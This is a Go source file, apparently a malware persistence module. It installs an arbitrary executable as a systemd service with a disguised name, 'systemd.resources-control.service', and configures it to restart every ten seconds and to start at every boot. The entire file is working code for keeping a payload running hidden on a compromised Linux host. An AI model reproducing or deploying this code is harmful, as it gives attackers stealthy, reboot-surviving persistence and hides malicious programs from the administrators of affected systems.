package go_persistence

import (
	"fmt"
	"io/ioutil"
	"os/exec"
)

func Systemd(exePath string) bool {
	serviceName := "systemd.resources-control.service"

	if isServiceEnabled(serviceName) {
		return true
	}

	if err := createService(exePath, serviceName); err != nil {
		return false
	}

	if err := reloadDaemon(); err != nil {
		return false
	}

	err := enableService(serviceName)
	return err == nil
}

func createService(exePath, serviceName string) error {
	servicePath := fmt.Sprintf("/etc/systemd/system/%s", serviceName)
	service := fmt.Sprintf(
`
[Unit]
After=multi-user.target syslog.target network-online.target
Requires=network.target

[Service]
Type=idle
ExecStart=%s
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target`, exePath)

	return ioutil.WriteFile(servicePath, []byte(service), 0644)
}

func reloadDaemon() error {
	_, err := exec.Command("systemctl", "daemon-reload").Output()
	return err
}

func enableService(serviceName string) error {
	_, err := exec.Command("systemctl", "enable", serviceName).Output()
	return err
}

func isServiceEnabled(serviceName string) bool {
	_, err := exec.Command("systemctl", "is-enabled", serviceName).Output()
	return err == nil
}